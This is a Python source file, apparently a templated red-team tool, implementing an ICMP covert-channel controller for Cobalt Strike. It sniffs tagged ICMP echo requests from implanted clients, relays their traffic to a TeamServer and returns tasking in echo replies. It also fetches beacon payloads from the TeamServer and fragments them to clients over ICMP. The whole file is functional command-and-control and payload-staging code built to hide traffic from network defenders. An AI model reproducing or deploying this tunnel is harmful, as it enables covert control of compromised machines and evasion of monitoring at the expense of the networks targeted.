import logging
import sys
from scapy.all import sniff, send, IP, ICMP, Raw, AsyncSniffer
import struct
import socket
import math
import time
import threading
import structlog

# === STRUCTLOG CONFIGURATION ===
log_filename = "icmp_controller.log"

logging.basicConfig(
    level=logging.DEBUG,
    format="%(message)s",
    handlers=[
        logging.StreamHandler(sys.stdout),  # Console
        logging.FileHandler(log_filename, mode='a')  # File
    ]
)

structlog.configure(
    processors=[
        structlog.stdlib.add_log_level,
        structlog.processors.TimeStamper(fmt="iso"),
        structlog.processors.JSONRenderer()
    ],
    logger_factory=structlog.stdlib.LoggerFactory(),
    wrapper_class=structlog.stdlib.BoundLogger,
    cache_logger_on_first_use=True,
)

logger = structlog.get_logger()

# === CONFIGS ===

ICMP_TAG = "{{ icmp_tag }}"
TAG_SIZE = len(ICMP_TAG)
# Must be same as `ICMP_PAYLOAD_SIZE` in client_x86.c, otherwise data will not get through correctly.
ICMP_PAYLOAD_SIZE = {{ icmp_payload_size }}
MAX_DATA_PER_CHUNK = ICMP_PAYLOAD_SIZE - TAG_SIZE  # 996

TEAMSERVER_IP = "{{ cs_teamserver_ip }}"
TEAMSERVER_PORT = {{ cs_teamserver_port }}
BEACON_PIPENAME = r"{{ pipename }}" # does NOT need the \\.\ for pipe, teamserver takes it as just the name
BEACON_ARCH = "x86"  # options: `x86`, `x64`


class Client:
    def __init__(self, client_ip, icmp_id, tag, expected_inbound_data_size=0):
        logger.info(
            "New client listener created",
            client_ip=client_ip,
            icmp_id=icmp_id,
            tag=tag,
            expected_inbound_data_size=expected_inbound_data_size
        )
        self.client_ip = client_ip
        self.icmp_id = icmp_id
        self.tag = tag
        self.expected_inbound_data_size = expected_inbound_data_size

        self.server_ip = TEAMSERVER_IP
        self.server_port = TEAMSERVER_PORT

        # data from client. Appended to each packet.
        self.data_from_client = b""
        self.payload = b""

        # need to connect to teamserver RIGHT AWAY
        self.ts_socket_setup()

    def handle_data(self):
        """
        Called each new checkin for the client. Collects all the inbound data, handles comms with teamserver, and sends data back to client.
        """
        logger.info("Handling new check-in", client_ip=self.client_ip, icmp_id=self.icmp_id)
        # need to make sure this buffer is clear each new checkin
        self.data_from_client = b""

        ######################################################
        # Get the inbound data (post seq 0)
        ######################################################
        self.recv_fragmented_icmp()

        ######################################################
        # Logic/Special Conditions
        ######################################################

        # need to add a special case to get the payload, as when sending payload options, the team server does not reply,
        # meaning that it just hangs there... so we need to do this so the controller can explicitly ask for the payload, then pass it on.
        if self.data_from_client == b"I WANT A PAYLOAD":
            logger.info(
                "Client requested payload",
                client_ip=self.client_ip,
                icmp_id=self.icmp_id
            )
            self.send_fragmented_icmp(
                client_ip=self.client_ip,
                client_icmp_id=self.icmp_id,
                full_payload=self.get_payload(),
            )
            logger.info(
                "Payload sent to client",
                client_ip=self.client_ip,
                icmp_id=self.icmp_id
            )
            # wipe data after
            return

        ######################################################
        # Proxy
        ######################################################

        # forward onto teamserver
        logger.debug(
            "Forwarding data to TeamServer",
            proxy_data=self.data_from_client
        )
        self.ts_send_frame(self.data_from_client)

        # Get response from TS
        logger.debug("Getting response from TeamServer")
        data_from_ts_for_client = self.ts_recv_frame()

        # send to client
        self.send_fragmented_icmp(
            client_ip=self.client_ip,
            client_icmp_id=self.icmp_id,
            full_payload=data_from_ts_for_client,
            tag=ICMP_TAG.encode(),
        )
        logger.info("Finished handling check-in", client_ip=self.client_ip, icmp_id=self.icmp_id)

    def get_payload(self) -> bytes:
        """
        Get payload from TeamServer
        """
        logger.info(
            "Requesting payload from TeamServer",
            teamserver_ip=TEAMSERVER_IP,
            teamserver_port=TEAMSERVER_PORT
        )
        self.ts_send_frame(f"arch={BEACON_ARCH}".encode())
        self.ts_send_frame(f"pipename={BEACON_PIPENAME}".encode())
        self.ts_send_frame(b"block=100")
        self.ts_send_frame(b"go")
        self.payload = self.ts_recv_frame()
        logger.debug("Received payload", payload_size=len(self.payload))

        if self.payload:
            logger.info(
                "Payload received from TeamServer successfully",
                teamserver_ip=TEAMSERVER_IP,
                teamserver_port=TEAMSERVER_PORT,
                payload_size=len(self.payload)
            )
        else:
            logger.warning(
                "Received an empty payload from TeamServer",
                teamserver_ip=TEAMSERVER_IP,
                teamserver_port=TEAMSERVER_PORT
            )
        return self.payload

    def send_payload(self):
        """
        Sends payload to client
        """
        if self.payload == b"":
            self.get_payload()

        self.send_fragmented_icmp(
            client_ip=self.client_ip,
            client_icmp_id=self.icmp_id,
            full_payload=self.payload,
        )

    def send_fragmented_icmp(
        self, client_ip, client_icmp_id, full_payload, tag=ICMP_TAG.encode()
    ):
        """
        Fragment `full_payload` into (ICMP_PAYLOAD_SIZE - TAG_SIZE) bytes each,
        and send immediately (no extra wait). The first reply is seq=0 (size),
        then seq=1..N data chunks.
        """
        total_size = len(full_payload)
        logger.info(
            "Starting fragmented ICMP send",
            client_ip=client_ip,
            icmp_id=client_icmp_id,
            total_size=total_size
        )
        # 1) Send seq=0 reply with total-size (4 bytes)
        size_bytes = total_size.to_bytes(4, "big")

        logger.debug(
            "Sending seq=0 size packet",
            client_ip=client_ip,
            icmp_id=client_icmp_id,
            total_payload_size=total_size
        )
        self.send_icmp_packet(
            ip_dst=client_ip,
            icmp_id=client_icmp_id,
            icmp_seq=0,
            payload=size_bytes,
            tag=tag,
        )

        # 2) Send actual data in (ICMP_PAYLOAD_SIZE - TAG_SIZE) byte chunks
        CHUNK_DATA_SIZE = ICMP_PAYLOAD_SIZE - len(tag)  # e.g. 500 - 4 = 496

        # warning for user when the total size is goingto be bigger than 1 packet
        if total_size > ICMP_PAYLOAD_SIZE:
            logger.warning(
                "Client is receiving a large transfer, beacon may appear offline while transferring data.",
                client_ip=client_ip,
                icmp_id=client_icmp_id,
                total_size=total_size
            )

        offset = 0
        seq = 1
        while offset < len(full_payload):
            chunk = full_payload[offset : offset + CHUNK_DATA_SIZE]
            logger.debug(
                "Sending data chunk",
                seq=seq,
                data_bytes=len(chunk)
            )
            self.send_icmp_packet(
                ip_dst=client_ip,
                icmp_id=client_icmp_id,
                icmp_seq=seq,
                payload=chunk,
                tag=tag,
            )
            offset += CHUNK_DATA_SIZE
            seq += 1
            time.sleep(0.1)

        logger.info(
            "Finished sending fragmented ICMP data",
            client_ip=client_ip,
            icmp_id=client_icmp_id,
            num_chunks=seq-1,
            total_size=total_size
        )

    def recv_fragmented_icmp(self):
        """
        Blocks until we’ve seen exactly self.expected_inbound_data_size bytes
        from (self.client_ip, self.icmp_id, tag=self.tag). Returns the assembled bytes.
        """
        expected_len = self.expected_inbound_data_size
        logger.info(
            "Starting to receive fragmented ICMP data",
            client_ip=self.client_ip,
            icmp_id=self.icmp_id,
            expected_len=expected_len
        )
        assembled_data = bytearray()

        max_data_per_chunk = ICMP_PAYLOAD_SIZE - TAG_SIZE  # e.g. 1000 - 4 = 996

        # warning for user when the total size is goingto be bigger than 1 packet
        if expected_len > ICMP_PAYLOAD_SIZE:
            logger.warning(
                "Client is sending back a large transfer, beacon may appear offline while transferring data.",
                client_ip=self.client_ip,
                icmp_id=self.icmp_id,
                expected_len=expected_len
            )

        while len(assembled_data) < expected_len:
            # Wait for the next ICMP Echo-Request from this client/ipc_id/tag
            matching_pkts = sniff(
                filter=f"icmp and src host {self.client_ip}",
                lfilter=lambda p: (
                    p.haslayer(ICMP)
                    and p[ICMP].type == 8
                    and p[ICMP].id == self.icmp_id
                    and p.haslayer(Raw)
                    and p[Raw].load.startswith(self.tag.encode())
                ),
                count=1,
            )
            incoming_pkt = matching_pkts[0]
            raw_load = incoming_pkt[Raw].load
            chunk_data = raw_load[TAG_SIZE:]  # strip off the 4-byte tag

            bytes_needed = expected_len - len(assembled_data)
            chunk_part = chunk_data[:bytes_needed]
            assembled_data += chunk_part

            # For logging
            icmp_seq = incoming_pkt[ICMP].seq & 0xFFFF
            self.data_from_client += chunk_part

            logger.debug("Received chunk data", chunk_part=repr(chunk_part))
            logger.debug(
                "Sniffer received packet",
                seq=icmp_seq,
                client_ip=self.client_ip,
                icmp_id=self.icmp_id,
                tag=self.tag
            )

        logger.info(
            "Finished receiving fragmented ICMP data",
            client_ip=self.client_ip,
            icmp_id=self.icmp_id,
            received_bytes=len(assembled_data)
        )
        return bytes(assembled_data)

    def send_icmp_packet(
        self, ip_dst, icmp_id, icmp_seq, payload, tag=ICMP_TAG.encode()
    ):
        """
        Always send as an Echo Reply (type 0).
        """
        full_payload = tag + payload
        packet = (
            IP(dst=ip_dst)
            / ICMP(type=0, id=icmp_id, seq=icmp_seq)
            / Raw(load=full_payload)
        )
        send(packet, verbose=False)
        logger.debug(
            "Sent ICMP REPLY",
            seq=icmp_seq,
            payload_len=len(full_payload)
        )

    def ts_recv_frame(self):
        # self.sock.setblocking(False)
        # self.sock.settimeout(2)
        raw_size = self.sock.recv(4)
        # print(raw_size)
        logger.debug("Frame header from TeamServer", raw_size=raw_size)
        if len(raw_size) < 4:
            logger.warning("TeamServer: Failed to read frame size", raw_size=raw_size)
            raise ConnectionError("Failed to receive frame size.")
        size = struct.unpack("<I", raw_size)[0]
        logger.debug("Unpacked frame header", frame_size=size)

        buffer = b""
        while len(buffer) < size:
            chunk = self.sock.recv(size - len(buffer))
            if not chunk:
                raise ConnectionError("Socket closed before full frame received.")
            buffer += chunk

        logger.debug("Successfully received full frame from TeamServer", received_bytes=len(buffer))
        return buffer

    def ts_send_frame(self, data: bytes):
        size = len(data)
        logger.debug("Frame going to TeamServer", size=size, data=data)
        self.sock.sendall(struct.pack("<I", size))
        self.sock.sendall(data)

    def ts_socket_setup(self):
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.settimeout(10)  # 10 sec timeout
        try:
            logger.info("Connecting to TeamServer...", server_ip=self.server_ip, server_port=self.server_port)
            self.sock.connect((self.server_ip, self.server_port))
            logger.info(
                "Connected to TeamServer",
                server_ip=self.server_ip,
                server_port=self.server_port
            )
        except socket.timeout:
            logger.error(
                "Socket timed out - is listener up?",
                server_ip=self.server_ip,
                server_port=self.server_port
            )
            self.sock.close()
            exit()
        except Exception as e:
            logger.error("Connection failed", error=str(e), exc_info=True)
            self.sock.close()
            self.sock = None
            exit()


######################################################
# Setup for listener
######################################################
dict_of_clients = {}


def go():
    logger.info("Starting ICMP C2 Controller")
    logger.info("Sniffer is now active and listening for packets...")
    sniff(filter="icmp", prn=packet_filter, store=0)


def packet_filter(packet):
    """
    Filters initial packets
    """
    # check to make sure packet is correct type, has Raw data
    if not (packet.haslayer(ICMP) and packet[ICMP].type == 8 and packet.haslayer(Raw)):
        return

    raw_load = packet[Raw].load
    # Make sure packet has our tag.
    if not raw_load.startswith(ICMP_TAG.encode()):
        return

    # extract data from packet
    client_ip = packet[IP].src
    icmp_id = packet[ICMP].id & 0xFFFF
    icmp_seq = packet[ICMP].seq & 0xFFFF

    # When we see seq=0, that signals “start of a new transfer”
    if icmp_seq == 0:
        logger.debug(
            "New seq=0 packet received",
            client_ip=client_ip,
            icmp_id=icmp_id
        )

        # Strip off the 4-byte tag (“RQ47”)
        content = raw_load[len(ICMP_TAG) :]  # .rstrip(b"\x00")
        logger.debug("seq=0 content", content=content)

        # every other interaction will be here, where it sends a size in seq 0
        try:
            expected_inbound_data_size = int.from_bytes(content[:4], "big")
        except IndexError:
            logger.warning("Received seq=0 packet with insufficient data for size", client_ip=client_ip, icmp_id=icmp_id)
            return

        if expected_inbound_data_size < 0:
            logger.error(f"Invalid length={expected_inbound_data_size} in seq=0", client_ip=client_ip)
            return

        # if client alreadt in dict, based on id, use that class to handle it
        # problem, this cuold collide if same pid, could just add in ip as well.
        key = (client_ip, icmp_id) # Using a tuple of IP and ID for a more unique key
        if key in dict_of_clients:
            logger.info(
                "Existing client checking in",
                client_ip=client_ip,
                icmp_id=icmp_id
            )
            new_size = int.from_bytes(raw_load[TAG_SIZE : TAG_SIZE + 4], "big")
            client = dict_of_clients[key]
            # set new expected size for the client to recieve
            client.expected_inbound_data_size = new_size

        else:
            logger.info("New client discovered", client_ip=client_ip, icmp_id=icmp_id)
            client = Client(
                client_ip=client_ip,
                icmp_id=icmp_id,
                tag=ICMP_TAG,
                expected_inbound_data_size=expected_inbound_data_size,
            )
            dict_of_clients[key] = client

        # client.handle_data()
        # move to threading so more than 1 client can be connected at a time withotut freezing everything up
        # Program should be able to exit and the listeners still run per client due to the daemon setting
        t = threading.Thread(target=client.handle_data, daemon=True)
        t.start()
        logger.debug(
            "Spawning new thread for client handler",
            thread_id=t.ident,
            client_ip=client_ip,
            icmp_id=icmp_id
        )


if __name__ == "__main__":
    go()